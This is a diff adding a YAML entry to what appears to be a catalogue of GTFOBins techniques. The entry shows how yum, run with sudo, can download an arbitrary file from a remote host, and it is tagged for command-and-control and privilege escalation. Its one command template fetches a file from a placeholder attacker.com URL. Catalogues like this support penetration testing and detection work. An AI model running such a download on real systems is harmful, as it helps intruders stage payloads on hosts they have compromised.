@@ -1,0 +1,26 @@
+id: gtfobins/yum/download/sudo
+type: binary
+platform: linux
+name: yum
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: yum install http://attacker.com/path/to/input-file.rpm
+  comment: The file on the remote host must have the `.rpm` extension, but the content does not have to
+    be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.
+references:
+- https://gtfobins.github.io/gtfobins/yum/
+tags:
+- linux
+- unix
+- gtfobins
